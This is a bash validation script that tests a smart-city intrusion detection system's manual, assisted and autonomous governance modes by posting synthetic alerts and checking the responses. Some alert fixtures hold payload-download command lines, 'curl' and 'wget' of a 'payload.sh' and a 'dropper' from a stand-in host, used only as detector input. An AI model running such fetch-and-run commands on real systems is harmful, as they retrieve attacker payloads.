#!/bin/bash
# =============================================================================
# Smart City IDS - Governance Mode End-to-End Validation
# Validates manual/assisted/autonomous with live alerts and real governance APIs.
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib/script-utils.sh"

API_BASE=""
AUTH_USER="${AUTH_USER:-admin}"
AUTH_PASS="${AUTH_PASS:-admin}"
INTERNAL_TOKEN="${IDS_INTERNAL_ALERT_TOKEN:-}"
ENABLE_FULL_AUTONOMY=0
RUN_ID=""
QUIET=0

usage() {
    cat <<'USAGE'
Usage: scripts/test-governance-modes.sh [options]

Options:
  --api-url URL          IDS API base URL (auto-detected if omitted)
  --username USER        Login user (default: admin)
  --password PASS        Login password (default: admin)
  --internal-token TOK   Internal alerts token (default: IDS_INTERNAL_ALERT_TOKEN env)
  --enable-full-autonomy Enable force-execution profile during autonomous cases
                          and include an explicit autonomous-malicious check.
  --run-id ID            Identifier printed in final run summary
  --quiet                Reduce non-essential output
  -h, --help             Show this help
USAGE
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --api-url) API_BASE="${2:-}"; shift 2 ;;
        --username) AUTH_USER="${2:-}"; shift 2 ;;
        --password) AUTH_PASS="${2:-}"; shift 2 ;;
        --internal-token) INTERNAL_TOKEN="${2:-}"; shift 2 ;;
        --enable-full-autonomy) ENABLE_FULL_AUTONOMY=1; shift ;;
        --run-id) RUN_ID="${2:-}"; shift 2 ;;
        --quiet) QUIET=1; shift ;;
        -h|--help) usage; exit 0 ;;
        *) die "Unknown option: $1" ;;
    esac
done

ensure_commands curl jq comm sed sort mktemp

if [[ -z "$API_BASE" ]]; then
    API_BASE="$(resolve_ids_api_url || true)"
fi
[[ -n "$API_BASE" ]] || die "Could not detect IDS API URL"
API_BASE="${API_BASE%/}"

say() {
    if [[ "$QUIET" -ne 1 ]]; then
        echo "$*"
    fi
}

detect_internal_token() {
    if [[ -n "$INTERNAL_TOKEN" ]]; then
        return 0
    fi

    if command -v kubectl >/dev/null 2>&1; then
        local from_deploy=""
        from_deploy="$(kubectl get deploy ids-api -n smart-city -o json 2>/dev/null \
            | jq -r '.spec.template.spec.containers[0].env[]? | select(.name=="IDS_INTERNAL_ALERT_TOKEN") | .value // empty' \
            | head -n1 || true)"
        if [[ -n "$from_deploy" ]]; then
            INTERNAL_TOKEN="$from_deploy"
            return 0
        fi
    fi
    return 1
}

detect_internal_token || die "Missing internal token. Set IDS_INTERNAL_ALERT_TOKEN or pass --internal-token."

request_json() {
    local method="$1"
    local url="$2"
    local body="$3"
    shift 3 || true
    local extra_headers=("$@")

    local tmp_body
    tmp_body="$(mktemp)"

    local http_code
    if [[ -n "$body" ]]; then
        http_code="$(curl -sS -o "$tmp_body" -w '%{http_code}' -X "$method" "$url" \
            -H 'Content-Type: application/json' "${extra_headers[@]}" -d "$body")" || {
            rm -f "$tmp_body"
            return 1
        }
    else
        http_code="$(curl -sS -o "$tmp_body" -w '%{http_code}' -X "$method" "$url" \
            "${extra_headers[@]}")" || {
            rm -f "$tmp_body"
            return 1
        }
    fi

    if [[ "$http_code" -lt 200 || "$http_code" -ge 300 ]]; then
        echo "HTTP $http_code for $method $url" >&2
        sed -n '1,160p' "$tmp_body" >&2 || true
        rm -f "$tmp_body"
        return 2
    fi

    if ! jq -e . "$tmp_body" >/dev/null 2>&1; then
        echo "Invalid JSON response for $method $url" >&2
        sed -n '1,160p' "$tmp_body" >&2 || true
        rm -f "$tmp_body"
        return 3
    fi

    cat "$tmp_body"
    rm -f "$tmp_body"
}

AUTH_TOKEN=""
ORIGINAL_MODE=""
ORIGINAL_FORCE_AUTONOMY="false"
FORCE_AUTONOMY_SUPPORTED=0
PREEXIST_BLOCK_POLICY=0
INITIAL_PENDING_AFTER_DRAIN=0
RESTORE_DONE=0

restore_mode() {
    if [[ "$RESTORE_DONE" == "1" ]]; then
        return 0
    fi
    RESTORE_DONE=1
    if [[ -n "$AUTH_TOKEN" && "$FORCE_AUTONOMY_SUPPORTED" == "1" ]]; then
        request_json "POST" "${API_BASE}/api/governance/autonomy/force?enabled=${ORIGINAL_FORCE_AUTONOMY}" "" \
            -H "Authorization: Bearer ${AUTH_TOKEN}" >/dev/null 2>&1 || true
    fi
    if [[ -n "$AUTH_TOKEN" && -n "$ORIGINAL_MODE" ]]; then
        request_json "POST" "${API_BASE}/api/governance/mode?mode=${ORIGINAL_MODE}" "" \
            -H "Authorization: Bearer ${AUTH_TOKEN}" >/dev/null 2>&1 || true
        echo "restored_mode:${ORIGINAL_MODE}"
        echo "restored_autonomy_force:${ORIGINAL_FORCE_AUTONOMY}"
    fi
    if [[ "$PREEXIST_BLOCK_POLICY" == "0" ]] && command -v kubectl >/dev/null 2>&1; then
        kubectl delete networkpolicy -n smart-city block-198-51-100-42 >/dev/null 2>&1 || true
    fi
}
trap restore_mode EXIT

login_payload="$(jq -nc --arg u "$AUTH_USER" --arg p "$AUTH_PASS" '{username:$u,password:$p}')"
login_resp="$(request_json "POST" "${API_BASE}/api/auth/login" "$login_payload")" || die "Authentication failed"
AUTH_TOKEN="$(printf '%s' "$login_resp" | jq -r '.access_token // empty')"
[[ -n "$AUTH_TOKEN" ]] || die "Authentication failed (no access_token)"

if command -v kubectl >/dev/null 2>&1; then
    if kubectl get networkpolicy -n smart-city block-198-51-100-42 >/dev/null 2>&1; then
        PREEXIST_BLOCK_POLICY=1
    fi
fi

status_resp="$(request_json "GET" "${API_BASE}/api/governance/status" "" -H "Authorization: Bearer ${AUTH_TOKEN}")" || die "Failed to read governance status"
ORIGINAL_MODE="$(printf '%s' "$status_resp" | jq -r '.mode // empty')"
[[ -n "$ORIGINAL_MODE" ]] || die "Governance status missing mode"
if printf '%s' "$status_resp" | jq -e 'has("autonomous_force_execution")' >/dev/null 2>&1; then
    FORCE_AUTONOMY_SUPPORTED=1
    ORIGINAL_FORCE_AUTONOMY="$(printf '%s' "$status_resp" | jq -r 'if .autonomous_force_execution then "true" else "false" end')"
fi

say "original_mode:${ORIGINAL_MODE}"
if [[ "$FORCE_AUTONOMY_SUPPORTED" == "1" ]]; then
    say "original_autonomy_force:${ORIGINAL_FORCE_AUTONOMY}"
else
    say "original_autonomy_force:unsupported"
fi

set_force_autonomy() {
    local enabled="$1"
    if [[ "$FORCE_AUTONOMY_SUPPORTED" != "1" ]]; then
        return 0
    fi
    request_json "POST" "${API_BASE}/api/governance/autonomy/force?enabled=${enabled}" "" \
        -H "Authorization: Bearer ${AUTH_TOKEN}" >/dev/null
}

set_mode() {
    local mode="$1"
    local resp
    resp="$(request_json "POST" "${API_BASE}/api/governance/mode?mode=${mode}" "" -H "Authorization: Bearer ${AUTH_TOKEN}")" || return 1
    local status
    status="$(printf '%s' "$resp" | jq -r '.status // "error"')"
    local effective_mode
    effective_mode="$(printf '%s' "$resp" | jq -r '.mode // empty')"
    [[ "$status" == "success" && "$effective_mode" == "$mode" ]]
}

get_governance_status() {
    local attempts=0 out=""
    while [[ $attempts -lt 6 ]]; do
        if out="$(request_json "GET" "${API_BASE}/api/governance/status" "" -H "Authorization: Bearer ${AUTH_TOKEN}")"; then
            printf '%s' "$out"
            return 0
        fi
        attempts=$((attempts + 1))
        sleep 1
    done
    return 1
}

get_pending() {
    local attempts=0 out=""
    while [[ $attempts -lt 6 ]]; do
        if out="$(request_json "GET" "${API_BASE}/api/governance/pending" "" -H "Authorization: Bearer ${AUTH_TOKEN}")"; then
            printf '%s' "$out"
            return 0
        fi
        attempts=$((attempts + 1))
        sleep 1
    done
    return 1
}

pending_ids_json() {
    local pending_json="$1"
    printf '%s' "$pending_json" | jq -c '[.actions[]?.id]'
}

count_json_array() {
    local arr_json="$1"
    printf '%s' "$arr_json" | jq -r 'length'
}

reject_ids_json_array() {
    local ids_json="$1"
    local count=0
    while IFS= read -r id; do
        [[ -n "$id" ]] || continue
        request_json "POST" "${API_BASE}/api/governance/reject/${id}?reason=mode-test-cleanup" "" \
            -H "Authorization: Bearer ${AUTH_TOKEN}" >/dev/null
        count=$((count + 1))
    done < <(printf '%s' "$ids_json" | jq -r '.[]')
    echo "$count"
}

drain_pending_queue() {
    local pending_json pending_count ids_json rejected_count
    pending_json="$(get_pending)"
    pending_count="$(printf '%s' "$pending_json" | jq -r '.pending_count // 0')"
    if [[ "$pending_count" -le 0 ]]; then
        return 0
    fi
    ids_json="$(pending_ids_json "$pending_json")"
    rejected_count="$(reject_ids_json_array "$ids_json")"
    echo "pretest_cleanup_rejected:${rejected_count}"
}

block_policy_count() {
    if ! command -v kubectl >/dev/null 2>&1; then
        echo "-1"
        return 0
    fi
    local rows
    rows="$(kubectl get networkpolicy -n smart-city block-198-51-100-42 --no-headers 2>/dev/null || true)"
    if [[ -z "$rows" ]]; then
        echo "0"
        return 0
    fi
    printf '%s\n' "$rows" | wc -l | awk '{print $1}'
}

post_internal_alert_for_mode() {
    local mode="$1"
    local ts
    ts="$(date -u +"%Y-%m-%dT%H:%M:%SZ")"

    local rule output priority proc_cmd src_ip
    case "$mode" in
        manual)
            rule="Governance Mode Validation - Manual"
            priority="Critical"
            output="Runtime compromise chain observed in traffic-camera: unexpected shell + outbound C2 callback + credential read attempt."
            proc_cmd="/bin/sh -c curl http://198.51.100.42/payload.sh"
            src_ip="198.51.100.42"
            ;;
        assisted)
            rule="Governance Mode Validation - Assisted"
            priority="Critical"
            output="Runtime compromise chain observed in traffic-camera: web exploit succeeded, reverse shell active, persistence artefact detected."
            proc_cmd="/bin/sh -c wget http://198.51.100.42/dropper -O /tmp/dropper"
            src_ip="198.51.100.42"
            ;;
        autonomous_malicious)
            rule="Governance Mode Validation - Autonomous Malicious"
            priority="Critical"
            output="Autonomous validation: confirmed malicious runtime chain with C2 callback and payload retrieval attempt from known-bad source."
            proc_cmd="/bin/sh -c curl http://198.51.100.42/payload.sh"
            src_ip="198.51.100.42"
            ;;
        autonomous)
            rule="Governance Mode Validation - Autonomous"
            priority="Informational"
            output="Routine telemetry heartbeat from street-lighting gateway. No anomaly indicators detected."
            proc_cmd="/usr/bin/heartbeat --send --service street-lighting"
            src_ip=""
            ;;
        *)
            die "Unknown mode for payload: $mode"
            ;;
    esac

    local payload
    payload="$(jq -nc \
        --arg rule "$rule" \
        --arg output "$output" \
        --arg priority "$priority" \
        --arg ts "$ts" \
        --arg mode "$mode" \
        --arg proc_cmd "$proc_cmd" \
        --arg src_ip "$src_ip" \
        '{
          output:$output,
          priority:$priority,
          rule:$rule,
          time:$ts,
          output_fields:{
            "container.name":"traffic-camera",
            "device.id":"traffic-camera-001",
            "proc.cmdline":$proc_cmd,
            "fd.sip":$src_ip,
            "validation.mode":$mode
          }
        }')"

    request_json "POST" "${API_BASE}/api/alerts/internal" "$payload" \
        -H "X-IDS-Internal-Token: ${INTERNAL_TOKEN}"
}

extract_metrics_json() {
    local status_json="$1"
    printf '%s' "$status_json" | jq -c '
      .metrics as $m |
      {
        auto_count: (($m.auto_executed // 0) | tonumber),
        manual_approved: (($m.manual_approved // $m.approved // 0) | tonumber),
        rejected: (($m.rejected // 0) | tonumber),
        expired: (($m.expired // 0) | tonumber),
        pending_metric: (($m.pending_approval // 0) | tonumber),
        total_actions_requested: (($m.total_actions_requested // 0) | tonumber)
      }
    '
}

mode_assertions() {
    local mode="$1"
    local summary_json="$2"

    case "$mode" in
        manual)
            local has_pending pending_delta
            has_pending="$(printf '%s' "$summary_json" | jq -r '[.actions_taken[]? | startswith("PENDING:")] | any')"
            pending_delta="$(printf '%s' "$summary_json" | jq -r '.new_pending_count')"
            [[ "$has_pending" == "true" ]] || die "Manual mode assertion failed: expected PENDING action"
            [[ "$pending_delta" -ge 1 ]] || die "Manual mode assertion failed: expected pending queue to increase"
            ;;
        assisted)
            local has_executed auto_before auto_after
            has_executed="$(printf '%s' "$summary_json" | jq -r '[.actions_taken[]? | test("^(isolate_pod|scale_up|block_ip|cordon_node|restart_pod)\\(")] | any')"
            auto_before="$(printf '%s' "$summary_json" | jq -r '.metrics_before.auto_count')"
            auto_after="$(printf '%s' "$summary_json" | jq -r '.metrics_after.auto_count')"
            [[ "$has_executed" == "true" ]] || die "Assisted mode assertion failed: expected at least one executed high-confidence action"
            [[ "$auto_after" -ge $((auto_before + 1)) ]] || die "Assisted mode assertion failed: auto_count did not increment"
            ;;
        autonomous)
            local destructive_count pending_delta
            destructive_count="$(printf '%s' "$summary_json" | jq -r '[.actions_taken[]? | test("^(isolate_pod|scale_up|block_ip|cordon_node|restart_pod)\\(")] | length')"
            pending_delta="$(printf '%s' "$summary_json" | jq -r '.new_pending_count')"
            [[ "$destructive_count" -eq 0 ]] || die "Autonomous mode assertion failed: benign alert triggered destructive action"
            [[ "$pending_delta" -eq 0 ]] || die "Autonomous mode assertion failed: benign alert created pending actions"
            ;;
        autonomous_malicious)
            local destructive_count pending_delta auto_before auto_after
            destructive_count="$(printf '%s' "$summary_json" | jq -r '[.actions_taken[]? | test("^(isolate_pod|scale_up|block_ip|cordon_node|restart_pod)\\(")] | length')"
            pending_delta="$(printf '%s' "$summary_json" | jq -r '.new_pending_count')"
            auto_before="$(printf '%s' "$summary_json" | jq -r '.metrics_before.auto_count')"
            auto_after="$(printf '%s' "$summary_json" | jq -r '.metrics_after.auto_count')"
            [[ "$destructive_count" -ge 1 ]] || die "Autonomous malicious assertion failed: expected at least one destructive action"
            [[ "$pending_delta" -eq 0 ]] || die "Autonomous malicious assertion failed: should not queue pending approvals"
            [[ "$auto_after" -ge $((auto_before + 1)) ]] || die "Autonomous malicious assertion failed: auto_count did not increment"
            ;;
        *) die "Unknown mode in assertions: $mode" ;;
    esac
}

run_mode_case() {
    local mode="$1"
    local cleanup_required="$2"
    local effective_mode="$mode"
    if [[ "$mode" == "autonomous_malicious" ]]; then
        effective_mode="autonomous"
    fi

    set_mode "$effective_mode" || die "Failed to set governance mode: $effective_mode"
    if [[ "$effective_mode" == "autonomous" && "$ENABLE_FULL_AUTONOMY" == "1" ]]; then
        set_force_autonomy "true" || die "Failed to enable autonomy force profile"
    else
        set_force_autonomy "false" || die "Failed to disable autonomy force profile"
    fi

    local pending_before_json status_before_json metrics_before_json
    pending_before_json="$(get_pending)"
    status_before_json="$(get_governance_status)"
    metrics_before_json="$(extract_metrics_json "$status_before_json")"

    local before_ids_json before_count
    before_ids_json="$(pending_ids_json "$pending_before_json")"
    before_count="$(printf '%s' "$pending_before_json" | jq -r '.pending_count // 0')"

    local alert_resp
    alert_resp="$(post_internal_alert_for_mode "$mode")" || die "Failed posting internal alert for mode: $mode"

    local alert_id status severity threat_type llm_engine actions_json actions_count
    status="$(printf '%s' "$alert_resp" | jq -r '.status // "unknown"')"
    alert_id="$(printf '%s' "$alert_resp" | jq -r '.alert_id // empty')"
    severity="$(printf '%s' "$alert_resp" | jq -r '(.severity // .analysis.severity // 0) | tonumber? // 0')"
    threat_type="$(printf '%s' "$alert_resp" | jq -r '.threat_type // .analysis.threat_type // "Unknown"')"
    llm_engine="$(printf '%s' "$alert_resp" | jq -r '.llm_engine // .analysis._llm_engine // "unknown"')"
    actions_json="$(printf '%s' "$alert_resp" | jq -c '.actions_taken // []')"
    actions_count="$(printf '%s' "$actions_json" | jq -r 'length')"

    [[ -n "$alert_id" ]] || die "Mode $mode: missing alert_id"

    local pending_after_json status_after_json metrics_after_json
    pending_after_json="$(get_pending)"
    status_after_json="$(get_governance_status)"
    metrics_after_json="$(extract_metrics_json "$status_after_json")"

    local after_ids_json after_count
    after_ids_json="$(pending_ids_json "$pending_after_json")"
    after_count="$(printf '%s' "$pending_after_json" | jq -r '.pending_count // 0')"

    local new_ids_json new_pending_count
    new_ids_json="$(jq -nc --argjson before "$before_ids_json" --argjson after "$after_ids_json" '
      [ $after[] | select((($before | index(.)) // null) == null) ]
    ')"
    new_pending_count="$(count_json_array "$new_ids_json")"

    local cleanup_pending="null"
    local cleanup_rejected="null"
    if [[ "$cleanup_required" == "1" ]]; then
        cleanup_rejected="$(reject_ids_json_array "$new_ids_json")"
        local pending_after_cleanup_json
        pending_after_cleanup_json="$(get_pending)"
        cleanup_pending="$(printf '%s' "$pending_after_cleanup_json" | jq -r '.pending_count // 0')"
        echo "${mode}_cleanup_rejected:${cleanup_rejected}"
        echo "${mode}_cleanup_pending:${cleanup_pending}"
    fi

    local trace_json governance_steps
    trace_json="$(request_json "GET" "${API_BASE}/api/audit/trace/alert-${alert_id}" "" -H "Authorization: Bearer ${AUTH_TOKEN}")"
    governance_steps="$(printf '%s' "$trace_json" | jq -r '[.steps[] | select(.event_type=="GOVERNANCE_ACTION" or .event_type=="ACTION_EXECUTED")] | length')"

    local summary_json
    summary_json="$(jq -nc \
      --arg mode "$mode" \
      --arg status "$status" \
      --arg alert_id "$alert_id" \
      --argjson severity "$severity" \
      --arg threat_type "$threat_type" \
      --arg llm_engine "$llm_engine" \
      --argjson actions_taken "$actions_json" \
      --argjson actions_taken_count "$actions_count" \
      --argjson pending_before "$before_count" \
      --argjson pending_after "$after_count" \
      --argjson new_pending_count "$new_pending_count" \
      --argjson metrics_before "$metrics_before_json" \
      --argjson metrics_after "$metrics_after_json" \
      --argjson audit_step_count "$(printf '%s' "$trace_json" | jq -r '.step_count // 0')" \
      --argjson governance_trace_steps "$governance_steps" \
      --arg cleanup_pending "$cleanup_pending" \
      --arg cleanup_rejected "$cleanup_rejected" \
      '{
        mode:$mode,
        status:$status,
        alert_id:$alert_id,
        severity:$severity,
        threat_type:$threat_type,
        llm_engine:$llm_engine,
        actions_taken:$actions_taken,
        actions_taken_count:$actions_taken_count,
        pending_before:$pending_before,
        pending_after:$pending_after,
        new_pending_count:$new_pending_count,
        auto_count:$metrics_after.auto_count,
        manual_approved:$metrics_after.manual_approved,
        rejected:$metrics_after.rejected,
        expired:$metrics_after.expired,
        total_actions_requested:$metrics_after.total_actions_requested,
        metrics_before:$metrics_before,
        metrics_after:$metrics_after,
        audit_step_count:$audit_step_count,
        governance_trace_steps:$governance_trace_steps,
        cleanup_pending:(if $cleanup_pending=="null" then null else ($cleanup_pending|tonumber) end),
        cleanup_rejected:(if $cleanup_rejected=="null" then null else ($cleanup_rejected|tonumber) end)
      }')"

    mode_assertions "$mode" "$summary_json"

    printf '%s\n' "$summary_json"

    # Print a compact audit trace excerpt for supervisor evidence.
    printf '%s\n' "$trace_json" | jq -c --arg mode "$mode" '{mode:$mode, trace_id, step_count, steps:[.steps[] | {event_type,status,payload:(.payload|{mode,action_type,target,reason,decision_status,rule})}]}'
}

drain_pending_queue
INITIAL_PENDING_AFTER_DRAIN="$(get_pending | jq -r '.pending_count // 0')"

run_mode_case "manual" "1"
run_mode_case "assisted" "1"
run_mode_case "autonomous" "0"
if [[ "$ENABLE_FULL_AUTONOMY" == "1" ]]; then
    run_mode_case "autonomous_malicious" "0"
fi

# Explicit restore before invariant checks
restore_mode

# Repeat-safety invariants
status_after_restore="$(get_governance_status)"
restored_mode_now="$(printf '%s' "$status_after_restore" | jq -r '.mode // empty')"
[[ "$restored_mode_now" == "$ORIGINAL_MODE" ]] || die "Invariant failed: restored mode mismatch ($restored_mode_now != $ORIGINAL_MODE)"

force_after="unsupported"
if [[ "$FORCE_AUTONOMY_SUPPORTED" == "1" ]]; then
    force_after="$(printf '%s' "$status_after_restore" | jq -r 'if .autonomous_force_execution then "true" else "false" end')"
    [[ "$force_after" == "$ORIGINAL_FORCE_AUTONOMY" ]] || die "Invariant failed: autonomy force not restored ($force_after != $ORIGINAL_FORCE_AUTONOMY)"
fi

pending_after_all="$(get_pending | jq -r '.pending_count // 0')"
[[ "$pending_after_all" -eq "$INITIAL_PENDING_AFTER_DRAIN" ]] || die "Invariant failed: residual pending actions ($pending_after_all != $INITIAL_PENDING_AFTER_DRAIN)"

policy_count_after="$(block_policy_count)"
if [[ "$policy_count_after" -ge 0 ]]; then
    if [[ "$PREEXIST_BLOCK_POLICY" == "1" ]]; then
        [[ "$policy_count_after" -eq 1 ]] || die "Invariant failed: expected preserved block policy count=1 got $policy_count_after"
    else
        [[ "$policy_count_after" -eq 0 ]] || die "Invariant failed: expected no residual block policy, got $policy_count_after"
    fi
fi

jq -nc \
  --arg run_id "${RUN_ID:-$(date -u +%Y%m%dT%H%M%SZ)}" \
  --arg original_mode "$ORIGINAL_MODE" \
  --arg restored_mode "$restored_mode_now" \
  --arg autonomy_force_before "$( [[ "$FORCE_AUTONOMY_SUPPORTED" == "1" ]] && echo "$ORIGINAL_FORCE_AUTONOMY" || echo "unsupported" )" \
  --arg autonomy_force_after "$force_after" \
  --argjson residual_pending "$pending_after_all" \
  --argjson residual_block_policies "$policy_count_after" \
  '{
    run_id: $run_id,
    original_mode: $original_mode,
    restored_mode: $restored_mode,
    autonomy_force_before: $autonomy_force_before,
    autonomy_force_after: $autonomy_force_after,
    residual_pending: $residual_pending,
    residual_block_policies: $residual_block_policies
  }'

exit 0
